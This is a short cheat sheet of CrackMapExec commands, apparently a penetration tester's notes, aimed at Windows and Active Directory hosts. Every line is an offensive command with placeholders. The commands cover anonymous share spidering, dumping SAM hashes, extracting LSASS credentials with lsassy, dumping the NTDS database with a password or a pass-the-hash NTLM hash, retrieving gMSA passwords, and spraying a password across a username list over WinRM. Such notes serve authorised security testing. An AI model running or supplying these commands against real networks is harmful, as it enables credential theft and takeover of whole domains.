# CrackMapExec

`crackmapexec ldap -L`

`crackmapexec mysql -L`

`crackmapexec smb -L`

`crackmapexec ssh -L`

`crackmapexec winrm -L`

`crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds`  

`crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k`

`crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>`

